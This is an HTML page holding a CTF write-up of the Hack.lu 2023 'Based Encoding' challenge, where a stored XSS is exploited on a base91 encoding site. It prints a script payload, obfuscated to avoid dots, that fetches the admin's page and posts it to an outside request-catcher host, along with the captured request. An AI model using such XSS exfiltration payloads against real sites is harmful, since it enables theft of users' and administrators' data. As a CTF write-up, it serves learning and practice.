@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="CTF: Hack.lu CTF 2023
+Based encoding as a service. But can we insert a little tomfoolery? Let&amp;rsquo;s find out.
+Link: https://based.skin
+Files: BASED.zip
+When we open the link, we are prompted to visit a website where we can register or log in.
+After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://morebaconstrips.github.io/writeups/web/based_encoding/" />
+
+
+    <title>
+        
+            Based Encoding :: Gabriele Abbate  — Cybersecurity MSc student
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="custom.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Based Encoding">
+<meta itemprop="description" content="CTF: Hack.lu CTF 2023
+Based encoding as a service. But can we insert a little tomfoolery? Let&rsquo;s find out.
+Link: https://based.skin
+Files: BASED.zip
+When we open the link, we are prompted to visit a website where we can register or log in.
+After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database."><meta itemprop="datePublished" content="2023-10-16T18:48:00+02:00" />
+<meta itemprop="dateModified" content="2023-10-16T18:48:00+02:00" />
+<meta itemprop="wordCount" content="616"><meta itemprop="image" content="https://morebaconstrips.github.io/"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://morebaconstrips.github.io/"/>
+
+<meta name="twitter:title" content="Based Encoding"/>
+<meta name="twitter:description" content="CTF: Hack.lu CTF 2023
+Based encoding as a service. But can we insert a little tomfoolery? Let&rsquo;s find out.
+Link: https://based.skin
+Files: BASED.zip
+When we open the link, we are prompted to visit a website where we can register or log in.
+After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database."/>
+
+
+
+    <meta property="og:title" content="Based Encoding" />
+<meta property="og:description" content="CTF: Hack.lu CTF 2023
+Based encoding as a service. But can we insert a little tomfoolery? Let&rsquo;s find out.
+Link: https://based.skin
+Files: BASED.zip
+When we open the link, we are prompted to visit a website where we can register or log in.
+After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://morebaconstrips.github.io/writeups/web/based_encoding/" /><meta property="og:image" content="https://morebaconstrips.github.io/"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2023-10-16T18:48:00+02:00" />
+<meta property="article:modified_time" content="2023-10-16T18:48:00+02:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-10-16 18:48:00 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                gabriele.portfolio.sh</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">~/about</a></li><li><a href="/projects">~/projects</a></li><li><a href="/writeups">~/writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://morebaconstrips.github.io/writeups/web/based_encoding/">Based Encoding</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>CTF: <a href="https://flu.xxx/">Hack.lu CTF 2023</a></p>
+<blockquote>
+<p>Based encoding as a service. But can we insert a little tomfoolery? Let&rsquo;s find out.</p>
+</blockquote>
+<p>Link: <a href="https://based.skin/">https://based.skin</a></p>
+<p>Files: BASED.zip</p>
+<p>When we open the link, we are prompted to visit a website where we can register or log in.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-41.png" alt="Screenshot from 2023-10-16 23-14-41.png"></p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-51.png" alt="Screenshot from 2023-10-16 23-14-51.png"></p>
+<p>After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-16.png" alt="Screenshot from 2023-10-16 23-15-16.png"></p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-26.png" alt="Screenshot from 2023-10-16 23-15-26.png"></p>
+<p>In the provided .zip file, you can find examples of both encoding and decoding implementations. The encryption method used is base91, and the alphabet used for this encryption is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base91_alphabet <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;f&#39;</span>, <span style="color:#e6db74">&#39;g&#39;</span>, <span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;m&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, <span style="color:#e6db74">&#39;s&#39;</span>, <span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;v&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;!&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;€&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>, <span style="color:#e6db74">&#39;)&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;°&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;^&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;~&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>decode_table <span style="color:#f92672">=</span> dict((v,k) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> enumerate(base91_alphabet))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(encoded_str): <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(bindata): <span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>To check our encodings, we can visit the main page. Each encoding has its unique ID.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-34.png" alt="Screenshot from 2023-10-16 23-15-34.png"></p>
+<p>Another action we can take is reporting an encoding to the admin by providing the corresponding ID.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-56.png" alt="Screenshot from 2023-10-16 23-15-56.png"></p>
+<p>The first thing that comes to mind, especially after reading the note at the top of the page mentioning &ldquo;an admin going there,&rdquo; is the possibility of stealing credentials through an XSS attack. Let&rsquo;s check if the website is vulnerable.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-56-09.png" alt="Screenshot from 2023-10-16 23-56-09.png"></p>
+<p>After confirming that the encoding works correctly, we can input the XSS payload and observe how the website responds.</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-25.png" alt="Screenshot from 2023-10-16 23-33-25.png"></p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-31.png" alt="Screenshot from 2023-10-16 23-33-31.png"></p>
+<p>The XSS has been triggered, the website is vulnerable!</p>
+<p>Before crafting the payload, it&rsquo;s essential to note that the base91 alphabet doesn&rsquo;t accept certain characters, such as &ldquo;.&rdquo;. To fetch admin data, we need a payload like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>to_enc_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;script&gt;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">fetch(&#34;/&#34;)</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    .then(x =&gt; x.text())</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    .then(x =&gt; fetch(&#34;https://nice.requestcatcher.com/test&#34;, {</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        method: &#34;post&#34;,</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        body: x</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    }))</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;/script&gt;ciao&#39;</span>
+</span></span></code></pre></div><p>To avoid using dots, we can access the functions using square brackets and obfuscate them by concatenating <code>String.fromCharCode(46)</code>. This is our plaintext payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>to_enc_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;script&gt;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">fetch(&#34;/&#34;)</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    [&#34;then&#34;](x =&gt; x[&#34;text&#34;]())</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    [&#34;then&#34;](x =&gt; fetch(&#34;https://nice&#34;+String[&#34;fromCharCode&#34;](46)+&#34;requestcatcher&#34;+String[&#34;fromCharCode&#34;](46)+&#34;com/test&#34;, {</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        method: &#34;post&#34;,</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        body: x</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    }))</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;/script&gt;ciao&#39;</span>
+</span></span></code></pre></div><p><img src="/images/based_encoding/Screenshot_from_2023-10-17_00-11-03.png" alt="Screenshot from 2023-10-17 00-11-03.png"></p>
+<p>Let&rsquo;s send the payload on the /create page.</p>
+<p>Now, to trigger the XSS, we need an admin to open the page. We can achieve this by reporting the ID of the document containing the malicious JavaScript and then wait for a response in the request catcher.</p>
+<p>This is what I obtained:</p>
+<pre tabindex="0"><code>POST /test HTTP/1.1
+
+Host: nice.requestcatcher.com
+
+Accept: */*
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Content-Length: 1586
+
+Content-Type: text/plain;charset=UTF-8
+
+Origin: https://based.skin
+
+Referer: https://based.skin/
+
+Sec-Ch-Ua: &#34;HeadlessChrome&#34;;v=&#34;117&#34;, &#34;Not;A=Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;117&#34;
+
+Sec-Ch-Ua-Mobile: ?0
+
+Sec-Ch-Ua-Platform: &#34;Linux&#34;
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: cross-site
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.62 Safari/537.36
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&#34;utf-8&#34;&gt;
+  &lt;title&gt;Based Sharing&lt;/title&gt;
+  &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css&#34;&gt;
+  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+  &lt;style type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    html,body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    body&gt;footer {
+      margin-top: auto;
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;header&gt;
+  &lt;nav class=&#34;navbar&#34; role=&#34;navigation&#34; aria-label=&#34;main navigation&#34;&gt;
+    &lt;div class=&#34;navbar-brand&#34;&gt;
+      &lt;a role=&#34;button&#34; class=&#34;navbar-burger&#34; aria-label=&#34;menu&#34; aria-expanded=&#34;false&#34; data-target=&#34;navbarBasicExample&#34;&gt;
+        &lt;span aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;
+        &lt;span aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;
+        &lt;span aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/div&gt;
+    &lt;div id=&#34;navbar&#34; class=&#34;navbar-menu&#34;&gt;
+      &lt;div class=&#34;navbar-start&#34;&gt;
+        &lt;a class=&#34;navbar-item&#34; href=&#34;/&#34;&gt;
+          Base
+        &lt;/a&gt;
+        &lt;a class=&#34;navbar-item&#34; href=&#34;/create&#34;&gt;
+          Create
+        &lt;/a&gt;
+        &lt;hr class=&#34;navbar-divider&#34;&gt;
+        &lt;a class=&#34;navbar-item&#34; href=&#34;/report&#34;&gt;
+          Report
+        &lt;/a&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+    
+
+  &lt;/nav&gt;
+&lt;/header&gt;
+
+&lt;body&gt;
+  &lt;div id=&#34;content&#34;&gt;
+    &lt;center&gt;
+      
+    
+&lt;center&gt;
+	&lt;section class=&#34;section&#34;&gt;
+		&lt;div class=&#34;container&#34;&gt;
+			&lt;h1 class=&#34;title&#34;&gt;Welcome to Based Encoding&lt;/h1&gt;
+			
+			&lt;div class=&#34;container&#34; id=&#34;based&#34;&gt;
+				&lt;a href=&#34;/e/3caf4d9b6351ca4cb471f06c513b1a69e526f6df&#34;&gt;3caf4d9b6351ca4cb471f06c513b1a69e526f6df&lt;/a&gt;
+			&lt;/div&gt;
+			
+&lt;/div&gt;
+&lt;/section&gt;
+&lt;/center&gt;
+
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><p>Let’s open the link it references and… Here’s the flag!</p>
+<p><img src="/images/based_encoding/Screenshot_from_2023-10-17_00-16-42.png" alt="Screenshot from 2023-10-17 00-16-42.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
